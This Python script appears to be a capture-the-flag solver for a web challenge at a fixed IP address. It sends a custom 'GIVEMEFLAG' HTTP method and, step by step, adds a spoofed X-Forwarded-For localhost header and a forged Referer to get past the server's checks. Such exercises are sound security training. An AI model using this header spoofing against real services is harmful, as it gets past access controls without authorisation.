import requests
from bs4 import BeautifulSoup


headers = {
    "Host": "140.115.59.7:12002",
    # "Referer": "http://140.115.59.7:12002/",
    "Referer": "https://www.adlSecurity.com", # Step 3
    "X-Forwarded-For": "127.0.0.1"  # Step 2
}

def step_one():
    url = 'http://140.115.59.7:12002/'

    method = 'GIVEMEFLAG'

    headers = {
        "Host": "140.115.59.7:12002",
        "Referer": "http://140.115.59.7:12002/",
    }

    response = requests.request(
        method, 
        url,
        headers=headers
    )

    with open('index1.html', 'w') as output_file:
        output_file.write(response.text)

    if response.status_code == 200:
        soup = BeautifulSoup(response.text, 'html.parser')
        tag_content = soup.find('h1').text
        print("Content within <h1> tags:")
        print(tag_content)

def step_two():
    url = 'http://140.115.59.7:12002/'

    method = 'GIVEMEFLAG'

    headers = {
        "Host": "140.115.59.7:12002",
        "Referer": "http://140.115.59.7:12002/",
        "X-Forwarded-For": "127.0.0.1"  # Step 2
    }

    response = requests.request(
        method, 
        url,
        headers=headers
    )

    with open('index2.html', 'w') as output_file:
        output_file.write(response.text)

    if response.status_code == 200:
        soup = BeautifulSoup(response.text, 'html.parser')
        tag_content = soup.find('h1').text
        print("Content within <h1> tags:")
        print(tag_content)

def step_three():
    url = 'http://140.115.59.7:12002/'

    method = 'GIVEMEFLAG'

    headers = {
        "Host": "140.115.59.7:12002",
        "Referer": "https://www.adlSecurity.com", # Step 3
        "X-Forwarded-For": "127.0.0.1"  # Step 2
    }

    response = requests.request(
        method, 
        url,
        headers=headers
    )

    with open('index3.html', 'w') as output_file:
        output_file.write(response.text)

    if response.status_code == 200:
        soup = BeautifulSoup(response.text, 'html.parser')
        tag_content = soup.find('h1').text
        print("Content within <h1> tags:")
        print(tag_content)

def main():
    step_one()
    step_two()
    step_three()

if __name__ == "__main__":
    main()
